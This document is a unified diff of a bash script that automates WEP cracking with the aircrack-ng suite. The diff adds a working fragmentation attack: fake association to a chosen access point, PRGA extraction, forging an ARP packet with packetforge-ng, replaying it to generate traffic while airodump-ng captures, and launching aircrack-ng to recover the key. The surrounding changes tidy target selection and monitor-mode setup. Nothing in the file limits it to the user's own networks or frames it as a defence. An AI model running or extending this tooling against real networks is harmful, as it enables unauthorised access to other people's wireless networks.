@@ -307,12 +307,16 @@ else
         [[ -n "$CHOICE" ]] || { echo "Invalid choice. Try again." >&2; continue; }
         break
     done
-    read -r AP <<< "$CHOICE)"
+    read -r AP <<< "$CHOICE"
     BSSID=$(echo "$AP" | awk -F ':' '{print $3} {print $4} {print $5} {print $6} {print $7} {print $8}' | sed 's/\\/\:/g' | xargs | sed 's/ //g')
     CHAN=$(echo "$AP" | awk -F ':' '{print $2}')
     ESSID=$(echo "$AP" | awk -F ':' '{print $1}')
+    SIG=$(echo $AP | awk -F ':' '{print $NF}')
+    CHANFLAG=1
+    REPLY="$CHAN"
     echo
-    echo "You picked ($AP"
+    echo "You picked ($AP)"
+    echo "$ESSID channel : $CHAN"
 fi
 }
 function wpa_attacks {
@@ -379,21 +383,166 @@ if [[ "$ASR" = [Yy] && "$ANS" = [Yy] ]]; then
     rm -f "$ESSID"*.netxml
     rm -f "$ESSID"*.csv
     rm -f replay*.cap
+    if [[ -n "$FRAGMENT" ]]; then
+        rm -f fragment*.xor
+        rm -f "$ESSID".arp
+    fi
 elif [[ "$ASR" = [Yy] && "$ANS" = [Nn] ]]; then
     rm -f "$ESSID"*.netxml
     rm -f "$ESSID"*.cap
     rm -f "$ESSID"*.csv
+    if [[ -n "$FRAGMENT" ]]; then
+        rm -f fragment*.xor
+        rm -f "$ESSID".arp
+    fi
     rm -f replay*.cap
 elif [[ "$ASR" = [Nn] ]]; then
     :
 fi
 }
-#function fragmentation { 
-#TODO
-#}
+function fragmentation { 
+clear
+echo "------------ WEP Fragmentation method ------------"
+echo
+read -p "Press Enter to continue ? " KEY
+if [[ -z "$STATE" ]]; then
+    echo
+    echo "Setting M/M on $IFACE"
+    set_mon >> /dev/null
+fi
+echo
+ESSID=$(tr -d ' ' <<< "$ESSID")
+echo
+COUNTER=0
+until [[ "$COUNTER" -eq 3 ]]; do
+    clear
+    let COUNTER+=1
+    echo "Attempting to Associate to $ESSID... $COUNTER/3"
+    aireplay-ng -1 0 -a "$BSSID" -h "$NEWMAC" "$IFACE"
+    SUCCESS=$?
+    if [[ "$SUCCESS" = 0 ]]; then
+        echo "Association successful!"
+        echo "Initiating packetforge-ng"
+        aireplay-ng -5 -b "$BSSID" -h "$NEWMAC" "$IFACE"
+        PRGA=$?
+        echo
+        break
+    else
+        echo "Association failed, trying again..."
+    fi
+done
+if [[ "$SUCCESS" != 0 ]]; then
+    echo "Unable to Associate to $ESSID, make sure your WLAN interface supports injection."
+    read -p "Test injection now ? [yn] " INJ
+    if [[ "$INJ" = [Yy] ]]; then
+        test_injection
+    fi
+    echo
+    echo "In some cases rebooting your computer usually fixes the Association failure."
+    echo
+    unset ESSID
+    unset CHAN
+    unset BSSID
+    unset SUCCESS
+    unset COUNTER
+    unset PRGA
+    read -p "Press Enter to go back" KEY
+    go_back
+fi
+aireplay-ng -5 -b "$BSSID" -h "$NEWMAC" "$IFACE"
+PRGA=$?
+EXT=".arp"
+if [[ "$PRGA" = 0 ]]; then
+    FRAGMENT=$(find "$(pwd)" -name "fragment*.xor" -printf '%T@ %p\n' | sort -k1 -n | awk -F ' ' '{print $2}' | tail -1)
+    if [[ -z "$FRAGMENT" ]]; then
+        echo
+        echo "No .xor file found."
+        echo
+        unset ESSID
+        unset CHAN
+        unset BSSID
+        unset PRGA
+        unset EXT
+        unset FRAGMENT
+        unset INJ
+        read -p "Press Enter to go back" KEY
+        go_back
+    fi
+    packetforge-ng -0 -a "$BSSID" -h "$NEWMAC" -k 255.255.255.255 -l 255.255.255.255 -y "$FRAGMENT" -w "$ESSID""$EXT"
+    CAPTURE="airodump-ng -c $CHAN --bssid $BSSID -w $ESSID $IFACE"
+    env -u SESSION_MANAGER xterm -hold -e "$CAPTURE" &
+    echo y | aireplay-ng -2 -r "$ESSID""$EXT" "$IFACE" &>/dev/null &
+    clear
+    echo 
+    read -p "Crack $ESSID now [yn] ? " ANSWER
+    if [[ "$ANSWER" = [Yy] ]]; then
+        CAPFILE=$(find "$(pwd)" -name "$ESSID*.cap" -printf '%T@ %p\n' | sort -k1 -n | awk -F ' ' '{print $2}' | tail -1)
+        if [[ -z "$CAPFILE" ]]; then
+            echo
+            echo "No $ESSID.cap files found."
+            echo
+            kill "$(pgrep aireplay-ng)"
+            killall xterm
+            clean_up
+            unset ESSID
+            unset CHAN
+            unset BSSID
+            unset PRGA
+            unset EXT
+            unset FRAGMENT
+            unset INJ
+            unset CAPFILE
+            read -p "Press Enter to go back" KEY
+            go_back
+        fi
+        CRACK="aircrack-ng -b $BSSID $CAPFILE"
+        env -u SESSION_MANAGER xterm -hold -e "$CRACK" &
+        clear
+        echo "Wait for aircrack-ng to finish. The password will be in this form (XX:XX:XX:XX:XX:XX)."
+        echo
+        echo "WARNING! xterm windows will close, copy the password before continuing."
+        echo
+        read -p "Press Enter to clean up files and go back..." KEY
+        kill "$(pgrep aireplay-ng)"
+        killall xterm
+        clean_up
+        unset ESSID
+        unset CHAN
+        unset BSSID
+        unset PRGA
+        unset EXT
+        unset FRAGMENT
+        unset INJ
+        unset CAPTURE
+        go_back
+    else
+        kill "$(pgrep aireplay-ng)"
+        killall xterm
+        clean_up
+        unset ESSID
+        unset CHAN
+        unset BSSID
+        unset PRGA
+        unset EXT
+        unset FRAGMENT
+        unset INJ
+        unset CAPTURE
+        read -p "Press Enter to go back" KEY
+        go_back
+    fi
+else
+    echo
+    read -p "Fragmentation method failed. Try Chop-Chop ?" ANSWER
+    if [[ "$ANSWER" = [Yy] ]]; then
+       echo "TODO"
+       exit 1
+    fi
+fi
+}
 function arp_replay {
 clear
 echo "------------ WEP ARP replay method ------------"
+echo
 read -p "Press Enter to continue ? " KEY
 if [[ -z "$STATE" ]]; then
     echo
@@ -445,25 +594,18 @@ echo
 if [[ "$ANS" = [Yy] ]]; then
     read -p "Try cracking $ESSID now ? [yn] : " ANSWER
     if [[ "$ANSWER" = [Yy] ]]; then
-        readarray -t FILES < <(find "$(pwd)" -name "*.cap")
-        if [[ -z "$FILES" ]]; then
+        CAP=$(find "$(pwd)" -name "$ESSID*.cap" -printf '%T@ %p\n' | sort -k1 -n | awk -F ' ' '{print $2}' | tail -1)
+        if [[ -z "$CAP" ]]; then
             echo "No .cap files found."
             echo
             unset ESSID
             unset AIRODUMP
             unset CHAN
             unset BSSID
+            unset CAP
             read -p "Press Enter to go back" KEY
             go_back
-        else
-            echo "Select a .cap file to crack"
-            select CHOICE in "${FILES[@]}"; do
-                [[ -n "$CHOICE" ]] || { echo "Invalid choice. Try again." >&2; continue; }
-                break
-            done
-            read -r CAP <<< "$CHOICE"
         fi
-        echo "You picked : $CAP"
         COMMAND="aircrack-ng $CAP"
         env -u SESSION_MANAGER xterm -hold -e "$COMMAND" &
         clear
@@ -519,11 +661,12 @@ function wep_attacks {
 clear
 echo "-------------- Select Attack Method --------------"
 echo
-echo "You picked ($AP"
+echo "You picked ($AP)"
 echo
-echo "AP Name: $ESSID"
-echo "AP Channel: $CHAN"
-echo "AP MAC: $BSSID"
+echo "AP Name       : $ESSID"
+echo "AP Channel    : $CHAN"
+echo "AP MAC        : $BSSID"
+echo "AP Signal     : $SIG/100"
 echo
 PROMPT="Select : "
 echo "1) ARP Replay Attack"
@@ -541,8 +684,7 @@ do
             break
             ;;
         2 )
-            #fragmentation
-            wep_attacks
+            fragmentation
             break
             ;;
         s )
@@ -611,27 +753,31 @@ if [[ -z "$STATE" ]]; then
     echo "Setting $IFACE in Monitor Mode..."
     echo
     echo "Creating new interface..."
-    read -p "Set Channel or (Press Enter to skip) : " REPLY
-    if [[ "$LIST" =~ (^|[[:space:]])"$REPLY"($|[[:space:]]) ]]; then 
+    if [[ "$CHANFLAG" = 1 ]]; then
         airmon-ng start "$IFACE" "$REPLY" >> /dev/null
-    elif [[ ! "$LIST" =~ (^|[[:space:]])"$REPLY"($|[[:space:]]) && "$REPLY" = "" ]]; then 
-        airmon-ng start "$IFACE" >> /dev/null
     else
-        echo "Invalid Channel \"$REPLY\" entered. "
-        read -p "Retry ? [yn] " ASK
-        if [[ "$ASK" = [Yy] && "$REPLY" != "" ]]; then
-            unset REPLY
-            unset ASK
-            unset LIST
-            set_mon
+        read -p "Set Channel or (Press Enter to skip) : " REPLY
+        if [[ "$LIST" =~ (^|[[:space:]])"$REPLY"($|[[:space:]]) ]]; then 
+            airmon-ng start "$IFACE" "$REPLY" >> /dev/null
+        elif [[ ! "$LIST" =~ (^|[[:space:]])"$REPLY"($|[[:space:]]) && "$REPLY" = "" ]]; then 
+            airmon-ng start "$IFACE" >> /dev/null
         else
-            echo
-            echo "Either set a valid channel or press Enter to skip"
-            unset REPLY
-            unset ASK
-            unset LIST
-            sleep 3
-            go_back
+            echo "Invalid Channel \"$REPLY\" entered. "
+            read -p "Retry ? [yn] " ASK
+            if [[ "$ASK" = [Yy] && "$REPLY" != "" ]]; then
+                unset REPLY
+                unset ASK
+                unset LIST
+                set_mon
+            else
+                echo
+                echo "Either set a valid channel or press Enter to skip"
+                unset REPLY
+                unset ASK
+                unset LIST
+                sleep 3
+                go_back
+            fi
         fi
     fi
     IFACE=$(ls /sys/class/net | grep "$IFACE")
@@ -647,11 +793,13 @@ if [[ -z "$STATE" ]]; then
     unset REPLY
     unset LIST
     unset ASK
+    unset CHANFLAG
 else
     echo
     echo "$IFACE already in monitor mode."
     NEWMAC=$(iw "$IFACE" info | grep addr | awk '{print $2}')
     sleep 2
+    unset CHANFLAG
 fi
 }
 function go_back {
